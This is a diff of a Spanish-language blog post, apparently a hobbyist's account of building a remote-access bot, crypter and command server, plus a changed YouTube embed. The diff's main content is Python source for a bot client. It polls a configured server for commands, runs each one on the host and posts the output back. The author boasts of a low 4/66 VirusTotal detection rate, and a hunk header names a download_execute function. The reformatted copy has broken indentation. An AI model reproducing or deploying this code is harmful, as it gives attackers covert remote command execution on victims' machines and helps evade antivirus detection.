@@ -224,47 +224,50 @@ por
 
 Aunque me da un poco de vergüenza compartir código tan cutre (no soy programador y menos de python), pero aquí lo dejo:
 
-    
-    import os, time, requests, sys, platform, locale, socket, configs, re
-    os_encoding = locale.getpreferredencoding()
-    time.sleep(2)
-    
-    def send_output(output):
-        pathplus1 = "report"
-        pathplus2 = "/api/"
-        path = pathplus2 + pathplus1
-        requests.post(configs.SERVER + path, {'botid': configs.btid, 'output': output})
-    
-    def run(comm):
-        stdin, stdout, stderr = os.popen3(comm)
-        output = stdout.read() + stderr.read()
-        if os.name == "nt":
-            output = output.decode(os_encoding, errors='replace') 
-        send_output(output)
-    
-    if __name__ == "__main__":
-        time.sleep(configs.PAUSE)
-        last_active = time.time()
-        is_idle = False
-        while 1:
-            if is_idle:
-                time.sleep(configs.REQUEST * 9)
-            else:
-                time.sleep(configs.REQUEST)
-            try:
-                pAPI = "/api/pop"
-                paraM = "?botid="
-                paraM1 = "&sysinfo="
-                command = requests.get(configs.SERVER + pAPI + paraM + configs.btid + paraM1 + platform.system() + " " + platform.release()).text
-                cmdargs = command.split(" ")
-                if command:
-                    run(command)
-                    last_active = time.time()
-                    is_idle = False
-                elif time.time() - last_active > configs.IDLE:
-                    is_idle = True
-            except Exception, exc:
-                is_idle = True
+```python
+
+import os, time, requests, sys, platform, locale, socket, configs, re
+os_encoding = locale.getpreferredencoding()
+time.sleep(2)
+
+def send_output(output):
+pathplus1 = "report"
+pathplus2 = "/api/"
+path = pathplus2 + pathplus1
+requests.post(configs.SERVER + path, {'botid': configs.btid, 'output': output})
+
+def run(comm):
+stdin, stdout, stderr = os.popen3(comm)
+output = stdout.read() + stderr.read()
+if os.name == "nt":
+    output = output.decode(os_encoding, errors='replace') 
+send_output(output)
+
+if __name__ == "__main__":
+time.sleep(configs.PAUSE)
+last_active = time.time()
+is_idle = False
+while 1:
+    if is_idle:
+	time.sleep(configs.REQUEST * 9)
+    else:
+	time.sleep(configs.REQUEST)
+    try:
+	pAPI = "/api/pop"
+	paraM = "?botid="
+	paraM1 = "&sysinfo="
+	command = requests.get(configs.SERVER + pAPI + paraM + configs.btid + paraM1 + platform.system() + " " + platform.release()).text
+	cmdargs = command.split(" ")
+	if command:
+	    run(command)
+	    last_active = time.time()
+	    is_idle = False
+	elif time.time() - last_active > configs.IDLE:
+	    is_idle = True
+    except Exception, exc:
+	is_idle = True
+
+```
 
 Logrando un [4/66](https://www.virustotal.com/#/file/ba3f9fb881ed48e9c69d8ae58d77b7fa66010b96e020e40e55a65000b8d50d5a/detection) en virustotal:
 
@@ -576,7 +579,7 @@ function download_execute(e) {
 
 #### Estrenando crypter y server:
 
-<style>.embed-container { position: relative; padding-bottom: 56.25%; margin-bottom: 20px; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src='https://www.youtube.com/embed/undefined' frameborder='0' allowfullscreen></iframe></div>
+<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src='https://www.youtube.com/embed/KvPTVs0BRB8' frameborder='0' allowfullscreen></iframe></div>
 
 &nbsp;
 
